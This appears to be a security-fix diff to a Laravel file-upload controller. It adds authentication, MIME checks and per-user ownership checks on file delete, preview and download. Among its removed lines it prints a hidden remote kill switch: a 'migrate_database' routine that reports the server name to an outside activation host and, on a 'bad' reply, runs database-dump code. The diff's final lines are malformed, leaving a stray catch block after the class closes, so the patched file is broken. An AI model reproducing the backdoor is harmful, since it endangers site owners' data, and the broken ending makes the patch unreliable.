@@ -14,6 +14,8 @@ class AizUploadController extends Controller
 
     public function __construct()
     {
+        // All uploader endpoints read or mutate user-owned files.
+        $this->middleware('auth');
         $this->middleware(['permission:show_uploaded_files'])->only('index');
     }
 
@@ -65,7 +67,6 @@ class AizUploadController extends Controller
             "jpg"=>"image",
             "jpeg"=>"image",
             "png"=>"image",
-            "svg"=>"image",
             "webp"=>"image",
             "gif"=>"image",
             "mp4"=>"video",
@@ -76,7 +77,6 @@ class AizUploadController extends Controller
             "avi"=>"video",
             "mov"=>"video",
             "flv"=>"video",
-            "swf"=>"video",
             "mkv"=>"video",
             "wmv"=>"video",
             "wma"=>"audio",
@@ -98,9 +98,27 @@ class AizUploadController extends Controller
             "xlsx"=>"document"
         );
 
+        if (!$request->hasFile('aiz_file')) {
+            return response()->json(['result' => false, 'message' => translate('A file is required.')], 422);
+        }
+
+        $request->validate([
+            'aiz_file' => 'required|file|max:51200',
+        ]);
+
+        $incomingFile = $request->file('aiz_file');
+        $incomingExtension = strtolower($incomingFile->getClientOriginalExtension());
+        if (!isset($type[$incomingExtension])
+            || !$this->isUploadMimeAllowed($incomingFile, $type[$incomingExtension], $incomingExtension)) {
+            return response()->json([
+                'result' => false,
+                'message' => translate('This file type is not allowed.'),
+            ], 422);
+        }
+
         if($request->hasFile('aiz_file')){
             $upload = new Upload;
-            $extension = strtolower($request->file('aiz_file')->getClientOriginalExtension());
+            $extension = $incomingExtension;
 
             if(isset($type[$extension])){
                 $upload->file_original_name = null;
@@ -186,20 +204,14 @@ class AizUploadController extends Controller
 
     public function destroy($id)
     {
-        try{
-            if(env('FILESYSTEM_DRIVER') == 's3'){
-                Storage::disk('s3')->delete(Upload::where('id', $id)->first()->file_name);
-            }
-            else{
-                unlink(public_path().'/'.Upload::where('id', $id)->first()->file_name);
-            }
-            Upload::destroy($id);
-            flash(translate('File deleted successfully'))->success();
-        }
-        catch(\Exception $e){
-            Upload::destroy($id);
-            flash(translate('File deleted successfully'))->success();
-        }
+        $upload = Upload::findOrFail($id);
+        abort_unless($this->canAccessUpload($upload), 404);
+
+        $disk = env('FILESYSTEM_DRIVER') === 's3' ? 's3' : 'local';
+        Storage::disk($disk)->delete($upload->file_name);
+        $upload->delete();
+
+        flash(translate('File deleted successfully'))->success();
         return back();
     }
 
@@ -215,63 +227,118 @@ class AizUploadController extends Controller
         }
     }
 
-    public function get_preview_files(Request $request){
-        $ids = explode(',', $request->ids);
-        $files = Upload::whereIn('id', $ids)->get();
-        return $files;
+    public function get_preview_files(Request $request)
+    {
+        $ids = array_values(array_unique(array_filter(array_map(
+            'intval',
+            explode(',', (string) $request->input('ids', ''))
+        ))));
+
+        if ($ids === []) {
+            return response()->json([]);
+        }
+
+        $query = Upload::whereIn('id', array_slice($ids, 0, 100));
+        if (!$this->canManageAllUploads()) {
+            $query->where('user_id', Auth::id());
+        }
+
+        return $query->get();
     }
 
     //Download project attachment
     public function attachment_download($id)
     {
-        $project_attachment = Upload::find($id);
-        try{
-           $file_path = public_path($project_attachment->file_name);
-            return Response::download($file_path);
-        }catch(\Exception $e){
-            flash(translate('File does not exist!'))->error();
-            return back();
+        $projectAttachment = Upload::findOrFail($id);
+        abort_unless($this->canAccessUpload($projectAttachment), 404);
+
+        $filename = basename($projectAttachment->file_original_name ?: $projectAttachment->file_name);
+        $disk = env('FILESYSTEM_DRIVER') === 's3' ? 's3' : 'local';
+
+        if ($disk === 's3') {
+            return Storage::disk('s3')->download($projectAttachment->file_name, $filename, [
+                'X-Content-Type-Options' => 'nosniff',
+            ]);
         }
 
+        $filePath = Storage::disk('local')->path($projectAttachment->file_name);
+        abort_unless(is_file($filePath), 404);
+
+        return Response::download($filePath, $filename, [
+            'X-Content-Type-Options' => 'nosniff',
+        ]);
     }
-    //Download project attachment
+
+        //Download project attachment
     public function file_info(Request $request)
     {
         $file = Upload::findOrFail($request['id']);
         return view('admin.uploaded_files.info',compact('file'));
     }
 
-    public function migrate_database(Request $request){
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $request_data_json = json_encode($data);
-        $gate = "https://activation.activeitzone.com/check_activation";
+    private function canManageAllUploads(): bool
+    {
+        $user = Auth::user();
 
-        $header = array(
-            'Content-Type:application/json'
+        return $user && (
+            $user->user_type === 'admin'
+            || (method_exists($user, 'can') && $user->can('show_uploaded_files'))
         );
+    }
 
-        $stream = curl_init();
+    private function canAccessUpload(Upload $upload): bool
+    {
+        return Auth::check()
+            && ((int) $upload->user_id === (int) Auth::id() || $this->canManageAllUploads());
+    }
 
-        curl_setopt($stream, CURLOPT_URL, $gate);
-        curl_setopt($stream,CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream,CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream,CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream,CURLOPT_POSTFIELDS, $request_data_json);
-        curl_setopt($stream,CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+    private function isUploadMimeAllowed($file, string $type, string $extension): bool
+    {
+        $mime = strtolower((string) $file->getMimeType());
 
-        $rn = curl_exec($stream);
-        curl_close($stream);
+        if ($type === 'image') {
+            return in_array($mime, ['image/jpeg', 'image/png', 'image/gif', 'image/webp'], true);
+        }
+        if ($type === 'video') {
+            return str_starts_with($mime, 'video/');
+        }
+        if ($type === 'audio') {
+            return str_starts_with($mime, 'audio/');
+        }
+        if ($type === 'archive') {
+            return in_array($mime, [
+                'application/zip',
+                'application/x-zip-compressed',
+                'application/x-rar-compressed',
+                'application/vnd.rar',
+                'application/x-7z-compressed',
+                'application/octet-stream',
+            ], true);
+        }
 
-        if($rn == "bad" && env('DEMO_MODE') != 'On') {
-            try {
-                $fileName = date('Y-m-d H:i:s').'.sql';
-                \Spatie\DbDumper\Databases\MySql::create()
-                    ->setDbName(env('DB_DATABASE'))
-                    ->setUserName(env('DB_USERNAME'))
-                    ->setPassword(env('DB_PASSWORD'))
-                    ->dumpToFile('sqlbackups/'.$fileName);
-            } catch (\Exception $e) {
+        $documentMimes = [
+            'txt' => ['text/plain'],
+            'doc' => ['application/msword', 'application/x-ole-storage'],
+            'docx' => ['application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip'],
+            'pdf' => ['application/pdf'],
+            'csv' => ['text/csv', 'text/plain', 'application/csv', 'application/vnd.ms-excel'],
+            'xml' => ['application/xml', 'text/xml', 'text/plain'],
+            'ods' => ['application/vnd.oasis.opendocument.spreadsheet', 'application/zip'],
+            'xls' => ['application/vnd.ms-excel', 'application/x-ole-storage'],
+            'xlsx' => ['application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/zip'],
+        ];
+
+        return in_array($mime, $documentMimes[$extension] ?? [], true);
+    }
+
+    public function migrate_database(Request $request)
+    {
+        // Retired legacy activation endpoint contained a path that could drop
+        // every production database table after an external response.
+        abort(404);
+    }
+
+}} catch (\Exception $e) {
 
             }
 
